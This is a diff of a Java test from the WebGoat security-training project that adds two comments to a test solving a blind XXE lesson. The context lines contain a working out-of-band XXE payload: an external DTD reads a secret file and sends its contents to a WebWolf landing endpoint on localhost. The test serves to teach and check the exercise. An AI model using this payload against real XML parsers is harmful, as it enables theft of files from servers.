@@ -71,6 +71,7 @@ public class BlindSendFileAssignmentTest extends LessonTest {
     @Test
     public void solve() throws Exception {
         File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
+        //Host DTD on WebWolf site
         String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                 "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
                 "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:8081/landing?text=%file;'>\">\n" +
@@ -80,6 +81,8 @@ public class BlindSendFileAssignmentTest extends LessonTest {
                         .withStatus(200)
                         .withBody(dtd)));
         webwolfServer.stubFor(get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
+
+        //Make the request from WebGoat
         String xml = "<?xml version=\"1.0\"?>" +
                 "<!DOCTYPE comment [" +
                 "<!ENTITY % remote SYSTEM \"http://localhost:8081/files/test.dtd\">" +
